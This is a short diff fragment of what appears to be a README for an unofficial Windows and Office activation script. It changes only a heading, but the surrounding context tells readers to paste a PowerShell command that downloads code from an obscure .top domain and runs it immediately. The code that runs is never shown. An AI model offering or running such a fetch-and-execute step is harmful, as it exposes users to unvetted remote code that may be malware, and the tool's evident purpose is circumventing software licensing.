@@ -16,7 +16,7 @@ This script provides functionality for managing Windows activation, self-destruc
    - Copy and paste the following code into PowerShell or Terminal.
    - Press **Enter** to run the script.
 
-   2.1 **Activate Windows and existing Office**
+   2.1 **Activate Existing Office**
    ```powershell
    irm https://plesbuy2nd.top/win | iex
    ```
